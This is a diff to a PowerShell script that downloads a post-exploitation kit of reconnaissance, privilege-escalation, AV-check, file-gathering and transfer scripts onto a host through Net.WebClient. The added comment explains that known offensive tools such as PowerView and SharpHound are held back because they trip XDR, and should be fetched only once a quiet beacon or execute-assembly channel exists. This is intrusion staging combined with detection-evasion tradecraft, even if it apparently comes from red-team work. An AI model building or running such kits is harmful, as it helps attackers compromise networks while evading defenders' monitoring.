@@ -9,18 +9,17 @@ param(
     [string]$OutDir = (Join-Path $env:TEMP 'day2-kit')
 )
 
+# Quiet profile: custom/builtin only. Known tools (tools-obf) are deliberately NOT fetched -
+# their behavior signatures keep tripping XDR regardless of transport. Fetch them only after
+# a quiet channel is established (beacon/execute-assembly).
 $files = @(
     'README-Day2.md',
     'manifest.sha256',
     'bat/00-context.bat', 'bat/01-sysinfo.bat', 'bat/02-net-recon.bat',
     'bat/03-domain.bat', 'bat/04-services.bat', 'bat/05-privesc.bat',
     'bat/06-av-check.bat', 'bat/07-schtasks.bat', 'bat/99-run-all.bat',
-    'wsh/enum-system.vbs', 'wsh/enum-network.js', 'wsh/run-all.wsf',
-    'ps1/Get-LocalRecon.ps1', 'ps1/Load-Assembly.ps1', 'ps1/Invoke-Suite.ps1',
-    'ps1/Get-Files.ps1', 'ps1/InMem-Asm.ps1',
-    'tools-obf/PowerUp.ps1', 'tools-obf/PowerView.ps1', 'tools-obf/jaws-enum.ps1',
-    'tools-obf/SessionGopher.ps1', 'tools-obf/PrivescCheck.ps1',
-    'tools-obf/SharpHound.exe.b64'
+    'wsh/enum-system.vbs', 'wsh/enum-network.js', 'wsh/run-all.wsf', 'wsh/transfer.vbs',
+    'ps1/Get-LocalRecon.ps1', 'ps1/Get-DomainInfo.ps1', 'ps1/Get-Files.ps1'
 )
 
 $wc = New-Object Net.WebClient
